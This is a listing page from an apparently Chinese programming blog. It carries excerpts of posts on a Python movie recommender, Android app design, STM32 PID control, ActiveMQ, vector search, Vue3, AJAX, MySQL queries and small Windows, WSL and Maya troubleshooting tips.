	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bab5a81500a40285f84554eedaa062f3/" rel="bookmark">
			使用 Python 构建电影推荐系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文将余弦相似度与 KNN、Seaborn、Scikit-learn 和 Pandas 结合使用，创建一个使用用户评分数据的电影推荐系统。文末提供技术交流平台，完整版代码找我获取。
在日常数据挖掘工作中，除了会涉及到使用Python处理分类或预测任务，有时候还会涉及推荐系统相关任务。
推荐系统用于各个领域，常见的例子包括视频和音乐服务的播放列表生成器、在线商店的产品推荐器或社交媒体平台的内容推荐器。在这个项目中，我们创建一个电影推荐器。
协同过滤通过收集许多用户的偏好或品味信息，对用户的兴趣进行自动预测（过滤）。到目前为止，推荐系统已经发展很长一段时间了，它们的模型基于各种技术，如加权平均、相关性、机器学习、深度学习等等。
自 1995 年以来，Movielens 20M dataset 拥有超过 2000 万个电影评级和标记活动。在本文中，我们将从movie.csv &amp; rating.csv文件中检索信息。使用Python库：Pandas, Seaborn, Scikit-learn和SciPy，使用k-近邻算法中的余弦相似度训练模型。
以下是该项目的核心步骤：
导入和合并数据集并创建 Pandas DataFrame
添加必要的特征来分析数据
使用 Seaborn 可视化数据并分析数据
通过设置阈值过滤无效数据
创建一个以用户为索引、以电影为列的数据透视表
创建 KNN 模型并输出与每部电影相似的 5 个推荐
导入数据 导入和合并数据集并创建 Pandas DataFrame
MovieLens 20M 数据集自 1995 年以来超过 2000 万的电影评级和标记活动。数据集获取：在公众号:『python学习与数据挖掘』后台回复：movies
# usecols 允许选择自己选择的特征，并通过dtype设定对应类型 movies_df=pd.read_csv('movies.csv', usecols=['movieId','title'], dtype={'movieId':'int32','title':'str'}) movies_df.head() ratings_df=pd.read_csv('ratings.csv', usecols=['userId', 'movieId', 'rating','timestamp'], dtype={'userId': 'int32', 'movieId': 'int32', 'rating': 'float32'}) ratings_df.head() 检查是否存在任何空值以及两个数据中的条目数。
# 检查缺失值 movies_df.isnull().sum() movieId 0 title 0 dtype: int64 ratings_df.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bab5a81500a40285f84554eedaa062f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0aba5448c044e6af66fae6b76c943a6d/" rel="bookmark">
			Windows安装grep
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows安装grep grep下载地址
下载 安装 可以选择自定义安装路径也可以选择默认安装，记住自己的安装路径
找到系统属性，环境变量，点击path，在安装路径后面加上\bin，添加到path里面。
安装完成 正常使用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0f3d38d252014fd80026d95d5aa448eb/" rel="bookmark">
			基于Android studio的个人日程时间管理系统java
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		APP端功能：
1、登录注册管理模块：主要功能是新用户的注册和现用户的登录的功能。（需要用学号进行认证）
2、时间管理模块：主要功能是
（1）任务清单（对一天内每小时所要完成的任务（外在以标签和日期的形式，可以点标签查看具体内容）进行添加、修改、删除）
（2）同时建立多个任务清单，有一个在首页的清单列表
（3）提醒（在任务清单的基础上增加到时提醒（闹钟或悬浮窗）
（4）搜索（能以标签或日期在搜索框中快速找到所需任务）
服务端功能：
1、注销用户，用户信息管理模块：主要功能是用户登录后，可以对自己的基本信息（就是密码，用户名）进行添加、编辑和删除的功能。
2、系统设置模块：主要功能是对应用软件的基本设置进行修改（黑夜模式），用户登录系统后，提供账号切换。
系统需求分析包括业务分析、功能性需求分析和非功能性需求分析。需要仔细考察类似网络教育系统的工作流程，对日常工作进行划分与分配，根据现实需求，设计功能完善，现实可行的系统。
系统设计阶段包括系统体系结构设计、功能模块设计和数据库设计。以需求分析的结果确定系统的总体框架和功能模块，并利用统一建模语言（UML）分模块设计系统的用例图、活动图、时序图和类图等，最后根据类图设计数据库表结构。
系统实现阶段包括前台界面的UI设计和后台功能模块代码设计。要求系统界面简洁直观、系统操作流畅，后台代码采用三层架构（界面表示层、业务逻辑层、数据访问层）编写。
系统测试阶段包括界面测试和功能测试。使用系统，验证系统界面是否简洁，页面不同功能的衔接是否灵活，正确。根据实际流程，在设计的系统上进行模拟测试，查看功能是都基本满足工作的需要。从而进一步修改完善系统，提高系统的实用性和稳定性
1. .gradle和.idea
这两个目录下放置的都是Android Studio自动生成的一些文件，大致是项目的配置信息，包括历史记录，版本控制信息等，无须关心，也不要去手动编辑（其实也可以将其隐藏起来）
2.app
项目中的代码、资源等内容都是放置在这个目录下的，我们后面的开发工作也基本是在这 个目录下进行的，待会儿还会对这个目录单独展开讲解。
3.build
这个目录主要包含了一些在编译时自动生成的文件，也不需要过多关心。
4.gradle
这个目录下包含了gradle wrapper的配置文件 ( 其实目前也不用过多的理解它，因为我也还在了解这个中，大概是帮忙配置每一个项目对应的radle版本的 ）
使用gradle wrapper的方式不需要提前将gradle下载好，而是会自动根据本地的缓存情况决定是否需要联网下载gradle。Android Studio默认就是启用gradle wrapper方式的，如果需要更改成离线模式，可以点击Android Studio导航栏→File→Settings→Build, Execution,Deployment→Gradle，进行配置更改。
5. .gitgnore
这个文件是用来将指定的目录或文件排除在版本控制之外的。（git ignore嘛）
6.build.gradle
这是项目全局的gradle构建脚本，通常这个文件中的内容是不需要修改的。稍后我们将会详细分析gradle构建脚本中的具体内容。
7.gradle.properties
这个文件是全局的gradle配置文件，在这里配置的属性将会影响到项目中所有的gradle编译脚本。
8.gradlew和gradlew.bat
这两个文件是用来在命令行界面中执行gradle命令的，其中gradlew是在Linux或Mac系统中使用的，gradlew.bat是在Windows系统中使用的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21555079eced9ef792be266893f26b4f/" rel="bookmark">
			STM32应用(十)经典控制算法PID(单级和串级)原理与代码实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.PID原理1.1 P I D三个参数简单理解1.2 P I D1.3 PI PD PID适用系统 2.串级PID原理3.PID代码3.1 单级PID3.1.1 初始化PID结构体3.1.2 单级PID计算3.1.3PID初始化3.1.4 清空PID 3.2 串级PID3.2.1 初始化串级PID结构体3.2.2 串级PID计算 4.PID的使用4.1 定义PID结构体并初始化4.2 定义电机速度函数4.3 在检测霍尔码盘时发送速度给电机4.4 实验效果 1.PID原理 PID是什么，P，I，D的分别功能
你和PID调参大神之间，就差这篇文章！
1.1 P I D三个参数简单理解 P（比例）： 简单来说，P就是凉了加热水，热了加凉水。比目标值小，我就增加一点，比目标值大，我就减小一点。（现在）
P可能出现的问题： 1.P太小，达到目标值需要花费很长的时间，而且会有稳态误差。2.P太大，达到目标值时可能会一直震荡。
I（积分）： 将一段时间内的误差累积起来加到输出上，可以消除历史误差对当前实际曲线的影响，提高系统的稳定性。 （过去）
I可能出现的问题： 1.I太小，可以消除稳态误差，但太慢了，对于某些需要很快响应的系统，显然不能满足要求。2.I太大，累计误差占比过大，就会出现抖动现象，难以收敛。
D（微分）： 减小最大超调量。(下图中③就是最大超调量。) 可以有效减小震动的幅度。让曲线收敛更快 （未来）
D可能出现的问题： 1.D太小，作用小，时间长。2.D太大，为了减小超调量，补偿的过多，导致震荡很久。
1.2 P I D 先调P，逐渐增加P直到系统出现震荡，将当前值乘0.7就是较为合适的值。
再调I，将稳态误差逐渐降低。
后调D，将最大超调量降到最低。
1.3 PI PD PID适用系统 PI：响应速度要求不那么高的系统。
PD：大惯性系统。超调量太大。
PID：都可以。
网上将PID原理太多太多了，我的理解也都是参见上面的内容。认真看肯定有收获。
2.串级PID原理 【串级PID】浅谈串级PID作用及意义——快速理解串级PID结构优势
这里个人理解就是，单机PID就是稳定速度。而需要带位置和角度的就要用串级PID了。常用于平衡车，板球系统等。
而转速闭环称为串级PID的内环，位置 (角度) 闭环称为串级PID的外环。其实也很好理解，位移是速度的积分，只有速度慢慢稳定，位置才能确定。
3.PID代码 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21555079eced9ef792be266893f26b4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6715f1f085c3ca2920afafaa9ed01391/" rel="bookmark">
			byte数组转string
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 /** * byte数组转string * @param src * @return */ private static String bytesToHexString(byte[] src) { StringBuilder stringBuilder = new StringBuilder(); if (src == null || src.length &lt;= 0) { return null; } for (int i = 0; i &lt; src.length; i++) { int v = src[i] &amp; 0xFF; String hv = Integer.toHexString(v); if (hv.length() &lt; 2) { stringBuilder.append(0); } stringBuilder.append(hv); } return stringBuilder.toString(); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/664d5801ce5c3a02b6dc1d6c3a441fcb/" rel="bookmark">
			ActiveMQ学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ActiveMQ学习笔记 笔记部分引用：https://blog.csdn.net/weixin_47135811/article/details/123426150
学习视频：https://www.bilibili.com/video/BV1DJ411m7NR?p=10&amp;spm_id_from=333.788.top_right_bar_window_history.content.click&amp;vd_source=b4b223afff1abfc0bf7da0beff6ce97d
Maven依赖 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!--JMS规范的jar依赖--&gt; &lt;!--&lt;dependency&gt; &lt;groupId&gt;javax.jms&lt;/groupId&gt; &lt;artifactId&gt;javax.jms-api&lt;/artifactId&gt; &lt;version&gt;2.0.1&lt;/version&gt; &lt;/dependency&gt; &amp;lt;!&amp;ndash;activeMQ对jms具体实现的jar依赖&amp;ndash;&amp;gt; &amp;lt;!&amp;ndash; https://mvnrepository.com/artifact/org.apache.activemq/activemq-client &amp;ndash;&amp;gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt; &lt;artifactId&gt;activemq-client&lt;/artifactId&gt; &lt;version&gt;5.13.2&lt;/version&gt; &lt;/dependency&gt; --&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt; &lt;artifactId&gt;activemq-pool&lt;/artifactId&gt; &lt;version&gt;5.13.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt; &lt;artifactId&gt;activemq-all&lt;/artifactId&gt; &lt;version&gt;5.13.2&lt;/version&gt; &lt;/dependency&gt; &lt;!-- 添加Log4J依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j&lt;/artifactId&gt; &lt;version&gt;1.2.16&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-nop&lt;/artifactId&gt; &lt;version&gt;1.6.4&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring-version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;${spring-version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-beans&lt;/artifactId&gt; &lt;version&gt;${spring-version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;${spring-version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/664d5801ce5c3a02b6dc1d6c3a441fcb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4787f33c0826f6a8fae22212a786065/" rel="bookmark">
			近似最近邻检索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着数据科学和人工智能的应用普及，我们对高维向量数据的管理与使用需求越来越大。尤其是更多ML算法的提出，everything to embedding的思想也被人熟知，大量的结构化或非结构化数据的涌入就意味着大量的高维度向量的生成。在这样的背景下，一个优雅的ANNS(近似最近邻搜索)算法就是很多AI应用产品落地过程中所必需的。下面我们将会从几个问题入手，逐渐地了解ANNS算法。
1 什么是近似最近邻搜索 顾名思义，ANNS算法的输入是目标节点，返回与目标节点最近的k个近邻节点。如下图所示，把蓝色小球作为目标节点，而我们期望做一次top 2近邻的检索，那么算法应当为我们返回两个红色小球。值得一提的是，目前距离度量函数通常选择L2或Inner-Product。
2 为什么需要近似最近邻搜索 我们将任何格式的数据映射到向量空间后，近邻检索可以用来快速比对每个向量节点。对于用户来说，这意味着给定一个查询后，ANNS算法会快速返回相关结果。下面举两个例子，描述一下我们身边常见的近邻搜索场景。
当我们在购物网站浏览某款篮球时，根据近邻检索算法返回的其他几类近似产品可能会出现在相关商品推荐板块。
当节点之间的关系代表一定的语义特征时，我们可以通过相似搜索的方法学习到相对于woman来说，具有类似man-king关系的词是queen。
总结来说，在搜索、推荐等场景下，我们并不需要绝对准确的结果。而是可以选择牺牲一定的精度，更为快速的从海量节点中获取到返回结果。
3 ANNS算法分类 摘自杭州电子科技大学王梦召同学的分享 目前，所有的ANNS算法可以分为基于树、基于哈希、基于量化、基于图四种方法。基于树和基于哈希的方法思路比较类似，都是通过查询一个子集去降低比较计算的次数。基于量化的方法与之不同，通过压缩编码的方式，降低距离计算的复杂度，以此来增加查找的效率。以上三种方法均存在一些瓶颈问题。例如，基于树的算法在标量和低维度的向量数据中表现较好。在百位或者千位维度的向量中，效率会急剧退化，甚至退化成暴力搜索。基于量化和基于哈希的方法均会在一些情况下存在精度天花板。
而在过去的十年间，基于图的ANNS算法一直是该领域的领先算法。此类算法的提出就是针对近邻检索提供有效、高效的解决方案。基于图做近邻搜索的主要思路是，通过一个entry point，不断访问邻居节点进行迭代，逐渐向目标节点进行收敛。这个过程既保证了减少比较的次数，又没有过多的精度损失。
4 基于图的ANNS算法 在了解了基于图的ANNS算法的优势和搜索过程后，我们比较关心的是图是如何形成的？那么，下面简单介绍下四种基图结构，大多数的图索引算法都是基于这四种基图演化而来。
Delaunay Graph:德劳内图是由德劳内三角剖分算法而来，该算法通过最大化最小角保证了三角形结构的唯一性。每个三角形三个节点的外接圆上和圆内不允许出现其他节点。
Relative Neighborhood Graph:RNG图是德劳内图的子图结构，相比于德劳内图，不同的是它需要保证每两个点形成的lune区域内不出现其他节点。
K-Nearest Neighbor Graph:K近邻图是有向图结构，每个节点与其K个距离最近的节点相连。
Minimum Spanning Graph:最小生成树保证了图连通的最小边个数。
每种基图都有其代表性的算法，基于不同的图结构，每种算法在近邻召回这一任务上的表现也各不相同。在后面的文章中，我们会更详细地为大家介绍每种基图的特点和一些有代表性的算法。
5 总结与展望 本篇是ANNS算法系列的第一篇文章，主要与大家分享算法中基本的概念。后续的文章将会分为以下几个方向:
ANNS算法: 这部分主要介绍基于图的向量检索算法
产品: 以TensorDB、Milvus、Vearch等向量检索类产品为例，分享产品细节
Paper Reading: 为大家分享向量检索领域经典or最新论文
感兴趣的同学可以持续关注这个公众号（帮正在努力创业的好朋友推一波），会在向量检索领域与大家共同学习、共同成长！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/033c1a2906f969866857da6b92b5499a/" rel="bookmark">
			【Spring】Day16
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 显示品牌列表 由于BrandMapper已经实现了“查询品牌列表”功能，所以，Mapper层无需处理。
在IBrandService接口中添加：
/** * 查询品牌列表 * * @return 品牌列表，如果没有匹配的品牌，将返回长度为0的列表 */ List&lt;BrandListItemVO&gt; list(); 在BrandServiceImpl中调用Mapper对象的查询方法直接实现：
@Override public List&lt;BrandListItemVO&gt; list() { log.debug("开始处理【查询品牌列表】的业务"); return brandMapper.list(); } 在BrandServiceTests中测试：
@Test void testList() { List&lt;?&gt; list = service.list(); log.debug("查询品牌列表，查询结果中的数据的数量：{}", list.size()); for (Object brand : list) { log.debug("{}", brand); } } 然后，在BrandController中添加处理请求的方法：
// http://localhost:9080/brands @ApiOperation("查询品牌列表") @ApiOperationSupport(order = 400) @GetMapping("") public JsonResult&lt;List&lt;BrandListItemVO&gt;&gt; list() { log.debug("开始处理【查询品牌列表】的请求……"); List&lt;BrandListItemVO&gt; list = brandService.list(); return JsonResult.ok(list); } 完成后，通过Knife4j的API文档可以进行调试（测试访问）。
2. SSO（Single Sign On：单点登录） 在集群甚至分布式系统中，通常只有某1种服务提供登录认证，无论是其它哪个服务需要用户登录，用户都应该在此专门提供登录认证的服务器端进行认证，并且，认证结果对于其它所有服务都是有效的！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/033c1a2906f969866857da6b92b5499a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5920f5091f4fef277f221da13e7982a5/" rel="bookmark">
			2022数模国赛c题——赛后总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、竞赛时间安排二、建模方法1.第一问1.1 对这些玻璃文物的表面风化与其玻璃类型、纹饰和颜色的关系进行分析；1.2 结合玻璃的类型，分析文物样品表面有无风化化学成分含量的统计规律1.3 根据风化点检测数据，预测其风化前的化学成分含量 2.第二问2.1 依据附件数据分析高钾玻璃、铅钡玻璃的分类规律；2.2 对于每个类别选择合适的化学成分对其进行亚类划分，给出具体的划分方法及划分结果。2.3 对分类结果的合理性和敏感性进行分析 3.第三问3.1 对附件表单 3 中未知类别玻璃文物的化学成分进行分析，鉴别其所属类型3.2 对分类结果的敏感性进行分析 4.第四问4.1 针对不同类别的玻璃文物样品，分析其化学成分之间的关联关系4.2 比较不同类别之间的化学成分关联关系的差异性 总结 前言 提示：本人大二，第一次参加国赛，建模方法可能比较稚嫩，想看专业解答的可以点左上角了（不是）
我个人借鉴的c题答案来自川川菜鸟（c站数模人都应该知道吧）
以下是我个人的数学建模专栏（会不定时持续更新）
https://blog.csdn.net/zedkyx/category_11863143.html?spm=1001.2014.3001.5482
一、竞赛时间安排 本次比赛从9月15日晚上6点发题开始至9月18日晚上22点最后一次提交md5码结束。
个人的时间安排如下（本人负责建模）：
9.15 晚上：查找论文、1.1、1.2、2.1 建模
9.16 一天：对2.2方法进行建模和修改
9.17 早上：四级
9.17 下午+晚上：对于2.3和3.2的合理性分析和敏感性分析进行研究并辅助编程及提供论文思路，查找资料得到1.3的思路
9.18 上午～下午2点：4.1的相关系数分析 和 4.2的典型相关分析
9.18 下午～晚上：1.3 草草结束
二、建模方法 1.第一问 1.1 对这些玻璃文物的表面风化与其玻璃类型、纹饰和颜色的关系进行分析； 我当时看到第一小问的时候想简单了，觉得只是作柱状图/折线图再进行分析就可以了，但实际上遇到这种类型的问题还是要进行专业的相关性分析（实际编程也很容易）。 1.2 结合玻璃的类型，分析文物样品表面有无风化化学成分含量的统计规律 有无风化很容易让人联想到反向使用logistic回归模型，只需要适当调整一下参数就可以了。 1.3 根据风化点检测数据，预测其风化前的化学成分含量 标答是决策树。 个人的想法：首先查找了很多化学方面的资料（以及题设里本身就有的文字），得到高钾和铅钡两个玻璃类型下分别最具代表性的化学成分，因为觉得其他的数据缺失值太多，而且受风化程度无法直从无风化和风化两个指标来计算（很显然会有风化的各个阶段），然后再根据上一问中得到的回归系数建立相应的拟合方程，实话说最后由于时间关系，系数矩阵和常数矩阵选取的蛮仓促的，尤其是系数矩阵还差很多因素还没有结果，所以最后结果也不太尽如人意。 2.第二问 2.1 依据附件数据分析高钾玻璃、铅钡玻璃的分类规律； 还是和1.2一样，很快想到了支持向量机这种方式（还去多把第一问的颜色、纹饰、风化程度为三个自变量做了一遍来水字数哈哈哈哈哈），可以做的优化还有引入松弛变量（敏感性分析）和拉格朗日变换（当时没怎么看下去） 2.2 对于每个类别选择合适的化学成分对其进行亚类划分，给出具体的划分方法及划分结果。 我们先确定最佳分类的数量。可以先用轮廓值对K-Means方法得到对聚类结果进行评价，并据此来确定最佳的类别数。（要聚类的对象是由2.1得到的三个具有代表性的化学元素） 具体结果就不再阐述了，如果有matlab在数学建模中的应用这本书的话就知道和葡萄酒的评价很想（优化方案就是和别的例如层次聚类和c-means进行比较） 2.3 对分类结果的合理性和敏感性进行分析 合理性： 对于总样本以及高钾和铅钡两个类型分别进行轮廓值分析，确定最佳类别数的合理性 敏感性： 原来有想过k- means的距离优化用图论的相关知识套，但最后知识改了距离的计算公式（manhattan和切比雪夫） 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5920f5091f4fef277f221da13e7982a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2df4db72979bb46182ac009c5a8ad6b6/" rel="bookmark">
			vue3之toRef、toRefs、toRaw
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 vue3之toRef、toRefs、toRawvue3之toReftoRef定义原始数据非响应式数据toRef定义原始数据为响应式数据 vue3之 toRefs 可批量创建响应式数据解构对象方式1解构对象方式2 toRaw 将响应式对象转化为普通对象markRaw包裹之后的对象，不会转化为响应式数据 vue3之toRef、toRefs、toRaw vue3之toRef toRef是将对象中的某个值转化为响应式数据 toRef(obj,key)注意点：就是 toRef 修改的值，只能修改原始对象为 响应式对象，否则视图无法变化。 toRef定义原始数据非响应式数据 toRef 如果原始对象是非响应式的就不会更新视图 数据是会变的 &lt;template&gt; &lt;div&gt; &lt;button @click="change"&gt;change&lt;/button&gt; &lt;div&gt;{{ obj }}&lt;/div&gt; &lt;/div&gt; &lt;/template&gt; &lt;script setup lang="ts"&gt; import { toRef, reactive } from 'vue' const obj = { num: 1, count: 2, } let state = toRef(obj, 'num') // toRef 如果原始对象是非响应式的就不会更新视图 数据是会变的 // toRef 如果原始对象是响应式时，原始数据，和copy的数据 都会产生影响，视图也发生变化 const change = () =&gt; { state.value = 3 obj.count = 3 console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2df4db72979bb46182ac009c5a8ad6b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbd079ffe5a28bfc6c558eb8e9cc0455/" rel="bookmark">
			AJAX——AJAX的异步与同步、AJAX代码封装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		📄个人主页：胖虎不秃头
✨个人简介：Java领域新星创作者，随时准备跑路的大二学生
🔥精品专栏：有这一个就够了
🌈个人名言：知道的越多，不知道的越多
💥刷题神器：推荐一款算法刷题网站Nowcoder👉点击跳转刷题网站进行注册学习
文章目录 AJAX的异步与同步AJAX代码封装 AJAX的异步与同步 什么是异步？什么是同步？
ajax请求1和ajax请求2，同时并发，谁也不用等谁，这就是异步。（a不等b，b也不等a）如果ajax请求1在发送的时候需要等待ajax请求2结束之后才能发送，那么这就是同步。（a等待b，或者b等待a，只要发生等待，就是同步。） 异步和同步在代码上如何实现？
// 假设这个是ajax请求1 // 如果第三个参数是false：这个就表示“ajax请求1”不支持异步，也就是说ajax请求1发送之后，会影响其他ajax请求的发送，只有当我这个请求结束之后，你们其他的ajax请求才能发送。 // false表示，不支持异步。我这个请求发了之后，你们其他的请求都要靠边站。都等着。你们别动呢，等我结束了你们再说。 xhr1.open("请求方式", "URL", false) xhr1.send() // 假设这个是ajax请求2 // 如果第三个参数是true：这个就表示“ajax请求2”支持异步请求，也就是说ajax请求2发送之后，不影响其他ajax请求的发送。 xhr2.open("请求方式", "URL", true) xhr2.send() 什么情况下用同步？（大部分情况下我们都是使用ajax异步方式，同步很少用。）
举一个例子 用户注册 用户名需要发送ajax请求进行校验邮箱地址也需要发送ajax请求校验其他的也可能需要发送ajax请求。。。并且最终注册按钮的时候，也是发送ajax请求进行注册。那么显然，注册的Ajax请求和校验的ajax请求不能异步，必须等待所有的校验ajax请求结束之后，注册的ajax请求才能发。 AJAX代码封装 AJAX请求相关的代码都是类似的，有很多重复的代码，这些重复的代码能不能不写，能不能封装一个工具类。要发送ajax请求的话，就直接调用这个工具类中的相关函数即可。
接下来，手动封装一个工具类，这个工具类我们可以把它看做是一个JS的库。我们把这个JS库起一个名字，叫做jQuery。（我这里封装的jQuery只是一个前端的库，和后端的java没有关系，只是为了方便web前端代码的编写，提高WEB前端的开发效率）
手动开发jQuery，源代码
function jQuery(selector){ if (typeof selector == "string") { if (selector.charAt(0) == "#") { domObj = document.getElementById(selector.substring(1)) return new jQuery() } } if (typeof selector == "function") { window.onload = selector } this.html = function(htmlStr){ domObj.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbd079ffe5a28bfc6c558eb8e9cc0455/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e47e62536239656b1da217829618171c/" rel="bookmark">
			VSCode 搜索所有中文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 VSCode 搜索所有汉字
(.[\u4E00-\u9FA5]+)|([\u4E00-\u9FA5]+.) 代码搜索中文字符正则表达式
[^\x00-\xff] 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97d21c8085ea497715f718c125468e07/" rel="bookmark">
			Maya常见的3个问题，这么解决准没错
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Maya是一个专业的 3D 动画、建模、模拟和渲染工具集，专为创建逼真的角色和大片的效果而设计。
在本文中，将指导您处理在使用 Autodesk Maya 时遇到的一些问题。
一、Maya 颜色管理问题 启动 Maya 时出现错误“无法在打开文件时应用颜色管理设置：无法完成颜色变换… ”。
解决方案：
将OpenGL设置为**DirectX **，如下所示：
1、打开**Maya **» **Windows **»设置/首选项»首选项。
2、在首选项框中，选择显示» 定位到**Viewport 2. 0 » 选择DirectX 11 **»确定。
3、重新启动Maya。
二、Maya 软件渲染太慢
原因
渲染设置：为渲染设备选择CPU 。
Arnold for Maya 软件在切换到另一台计算机时可能无法交互。或者远程服务器上的GPU被禁用。
解决方案
渲染设置：为渲染设备选择GPU 。
2.您需要 检查显卡/GPU，然后更新最新版本的NVIDIA驱动程序。
三、电脑带不动maya卡顿崩溃怎么办？
Maya渲染卡顿太慢怎么办呢？其实大多数的原因是本地电脑算力不足，但是现在购置升级硬件成本高，弹性按需使用高性能云电脑，更高效。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8533ec4193d3d21f7110d598ca65570/" rel="bookmark">
			WSL无法打开或者卡死
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WSL无法打开或者卡死后，使用管理员权限打开终端(比如cmd)，然后输入：
netsh winsock reset 最后，重启windows即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/39195b9e556fd6aa801ba929a7da4797/" rel="bookmark">
			MySQL进阶语句
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
引言
一、常用查询
1.1、order by按关键字排序
升序排序
降序排序
结合where进行条件过滤在排序
多字段排序
1.2、and/or判断
and/or使用
1.3、distinct查询不重复记录
1.4、GROUP BY对结果进行分组
1.5、limit限制结果条目
1.6、设置别名（alias-as）
查询表的记录数量，以别名显示
利用as，将查询的数据导入另一个表内
1.7、通配符
二、子查询
2.1、select查询
相同表查询
多表查询
NOT取反，将子查询的结果，进行取反操作
2.2、insert插入
2.3、update更新
2.4、delete删除
2.5、exists
三、MySQL视图
3.1、视图与表的区别
3.2、视图与表的联系
修改视图表数据
更改源表数据
四、NULL值
4.1、NULL值与空值区别
4.2、查询空值与非空值
五、连接查询
5.1、内连接
5.2、左连接
5.3、右连接
总结
引言 对MySQL数据库的查询，除了基本的查询外，有时候需要对查询的结构集进行处理。例如只取10条数据，对查询结果进行排序或分组等等
一、常用查询 1.1、order by按关键字排序 实用select语句可以讲需要的数据从mMySQL数据库中查询出来，如果对插叙的结果进行排序，可以实用order by语句来对语句实现排序，并最终讲排序的结果返回给用户，这个语句的排序不光可以针对某一个 字段，也可以针对多个字段
语法：
select 字段1,字段2... from 表名 order by 字段1,字段2... asc #查询结果以升序方式显示，asc可以省略 select 字段1，字段2... from 表名 order by 字段1，字段2，... desc #查询结果以降序方式显示 1、ASC是按照升序进行排序，是默认的排序方式，即ASC可以省略。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/39195b9e556fd6aa801ba929a7da4797/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/162a5070c7d835243ecabb5ee50c77ae/" rel="bookmark">
			Processon思维导图、画板、流程图、架构图、时序图 模板超多。。。
			</a>
		</h2>
		
	</header>
